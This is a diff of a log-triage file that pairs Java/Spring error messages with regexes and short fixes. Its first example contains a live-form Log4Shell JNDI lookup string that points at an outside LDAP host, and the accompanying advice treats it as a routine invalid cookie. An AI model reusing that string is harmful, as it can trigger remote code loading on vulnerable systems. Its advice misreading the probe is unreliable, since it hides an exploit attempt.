@@ -1,10 +1,40 @@
-exception processing errorpage\[errorcode=\d+, location=/[^\]]+\]
-servlet\.service\(\) for servlet \[[^\]]+\] in context with path \[[^\]]*\] threw exception
-request execution failed with message: i/o error on (put|get) request for "": connect to [^ ]+ failed(: [^;]+)?
-a cookie header was received \[\$\{[^}]+\}\] that contained an invalid cookie\. that cookie will be ignored\.
-request execution failed with message: i/o error on (put|get) request for "": connect to [^ ]+ failed(: [^;]+)?
 
+Error Example: a cookie header was received [${jndi:ldap://log4shell-generic-8molyf0ab2aqtscsyugh${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-8molyf0ab2aqtscsyugh${lower:ten}.w.nessus.org/nessus};] that contained an invalid cookie.
 
-model
+Regex: `a cookie header was received \[.*?\] that contained an invalid cookie\.`
 
-error no. | regex | solution | comment
+Solution: This regex will help you identify instances where a cookie header is received with an invalid cookie. You should then inspect the actual cookie content to determine the cause of the error.
+
+---
+
+Error Example: servlet.service() for servlet [dispatcherservlet] in context with path [] threw exception
+
+Regex: `servlet\.service\(\) for servlet \[.*?\] in context with path \[\] threw exception`
+
+Solution: This regex will help you identify instances where a servlet named "dispatcherservlet" in a specific context path throws an exception. You should investigate the servlet configuration and the exception stack trace to diagnose and resolve the issue.
+
+---
+
+Error Example: discoveryclient_rdd-async-service/p1049433.prod.cloud.fedex.com:rdd-async-service:6521 - was unable to send heartbeat!
+
+Regex: `discoveryclient_.*? - was unable to send heartbeat!`
+
+Solution: This regex will help you identify instances where a component with a name starting with "discoveryclient_" was unable to send a heartbeat. You should check the configuration and network connectivity of the component to ensure it can send heartbeats as expected.
+
+---
+
+Error Example: exception processing errorpage[errorcode=0, location=/error]
+
+Regex: `exception processing errorpage\[.*?\]`
+
+Solution: This regex will help you identify instances where an exception is raised during the processing of an error page. You should investigate the error page configuration and the specific error code to understand and address the issue.
+
+---
+
+Error Example: request execution failed with message: i/o error on put request for "": connect to rddgwslas03.prod.cloud.fedex.com:8094 [rddgwslas03.prod.cloud.fedex.com/10.228.54.50] failed: connection refused (connection refused); nested exception is org.apache.http.conn.httphostconnectexception: connect to rddgwslas03.prod.cloud.fedex.com:8094 [rddgwslas03.prod.cloud.fedex.com/10.2
+
+Regex: `request execution failed with message: i/o error on put request for ".*?"`
+
+Solution: This regex will help you identify instances where a request execution fails due to an I/O error on a put request. You should investigate the connectivity issues mentioned in the error message and check if the target server is reachable on the specified port.
+
+---
